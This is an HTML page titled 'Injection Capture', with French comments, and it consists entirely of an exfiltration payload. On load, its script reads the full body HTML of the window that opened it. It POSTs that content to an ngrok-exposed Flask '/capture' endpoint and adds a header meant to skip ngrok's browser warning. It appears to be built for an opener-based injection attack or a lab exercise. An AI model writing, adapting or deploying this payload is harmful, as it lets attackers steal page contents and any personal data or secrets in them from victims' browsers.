<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8">
    <title>Injection Capture</title>
</head>

<body>
    <h1>Injection en cours...</h1>
    <script>
        if (window.opener) {
            let bodyContent = window.opener.document.body.innerHTML;

            // Envoi des données vers ton serveur Flask via ngrok
            fetch("https://e4a4-2a04-cec0-1020-604e-e5d3-59aa-943a-2da0.ngrok-free.app/capture", {  // URL de ton serveur Flask exposé
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                    "ngrok-skip-browser-warning": "true",  // En-tête pour supprimer la page d'avertissement de ngrok
                    "User-Agent": "MyCustomUserAgent"  // Optionnel, en-tête pour contourner l'avertissement dans certains cas
                },
                body: JSON.stringify({ content: bodyContent })
            }).then(response => response.json())
                .then(data => {
                    console.log("Réponse du serveur Flask :", data);
                }).catch(err => console.error("Erreur :", err));
        } else {
            console.log("Pas d'opener disponible");
        }
    </script>
</body>

</html>
